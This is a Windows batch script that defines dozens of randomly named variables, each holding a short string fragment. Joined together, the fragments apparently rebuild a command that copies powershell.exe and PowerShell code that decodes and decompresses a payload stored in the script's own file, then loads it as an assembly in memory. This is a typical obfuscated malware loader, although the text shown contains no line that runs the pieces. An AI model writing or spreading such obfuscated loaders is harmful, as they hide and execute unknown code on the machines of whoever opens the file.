@echo off
set "amWYNVJthb=nd"
set "azGflSaiYc=po"
set "hrHcKgnGTe=Po"
set "fbKFcYsVVp=.e"
set "lQatXSZRXM=rS"
set "sOMVsgQXzZ=he"
set "HYCVWQxfVd=em"
set "xvBJskpvZl=st"
set "uCKKIxDIrw=we"
set "wuBKBAUVSi=co"
set "tjLnQzTMeA=in"
set "ieWaJfcvof=Wi"
set "qYUJDnpOkf=32"
set "xxZjfyBRfe=do"
set "VBkTpehfaj=ws"
set "jkPQdJFKzx=s\"
set "AzNEXqqoeS=\v"
set "hyTargPJKc=:\"
set "OBLiCARWgr= C"
set "CchKkVputF=rs"
set "xvIaqUCUnw=Sy"
set "VDRxVNIgxT=\W"
set "lUYbKsRzlS=ll"
set "yrFyRHPDWT=he"
set "QBTGSQlQod=we"
set "DFOsDyWuPk=xe"
set "HFjskrSZIF=0\"
set "GIQpLgLCAt=ll"
set "WrekzYTzSm=py"
set "JYPBayxeTs=ow"
set "bIUvxUlRYe= /"
set "hvIhMGQOsB=1."
set "jNUZAwHZvS=y "
set "sPtkwSjLiZ=cd"
set "vlXnNfhOQy= %~dp0"
set "FVfNIGKeji=, (,"
set "hDdAEJNURz=.Cre"
set "yugTLRcWey=[Sys"
set "IdMAZnDkgU=($kw"
set "iQKfZfUZcp=..-1"
set "XCXpauLTXX=::De"
set "prHjjeIQkb=urit"
set "HfPMuEBraa=[Sys"
set "QxvPIpTNQe=PTtG"
set "MowZsldgNx=('%~f0'"
set "DwWFNPsHCf=pose"
set "VNcQaPYRSD= '')"
set "CAMflPtCIS=join"
set "EaHVYnCcZZ=ew-O"
set "bkzbtCUXJD='[-1"
set "ScEaBNPVzJ=.IO."
set "yYUzcFvlhh=nage"
set "shqYSKPyww=morF"
set "xvVvuqYMOn=lit("
set "rwMLZWRSCW=16] "
set "GyfFAQsFdq=embl"
set "cZNgsmpUfr=ne);"
set "LEKfCDIjnG=m.IO"
set "RqfRnnChFI=tem."
set "mZnTdIeWTM=aPiG"
set "yIoBojyFTi=rtS4"
set "wKvgilKCby=whGN"
set "FlAdoWcrtJ=[-1."
set "qigVbDtMbC=.Cop"
set "YsNxXOYpam=;$Hx"
set "otLVRMziwe=m(, "
set "gXEpXqhwnY=]::("
set "NTifnCYqIy=Invo"
set "PNyNdXgBfV=.Dis"
set "oIEhaXDZCJ=ct S"
set "iuikoyMBSL=ress"
set "FUaNiuLUXC=);$U"
set "QCqFnNnrzE=em.I"
set "inCyYyZyMR=d;$O"
set "XBekIHdYwU=ck($"
set "tLpSlBHtQP===')"
set "YRGlfixvjS=pose"
set "ragEZASqkN=-joi"
set "daDPdoVWOw=1] -"
set "JgcrkaRahG=sion"
set "UeAKHiILgn=gMod"
set "ZWXOPjhphF=$Brt"
set "KgzdQzPRJa=rity"
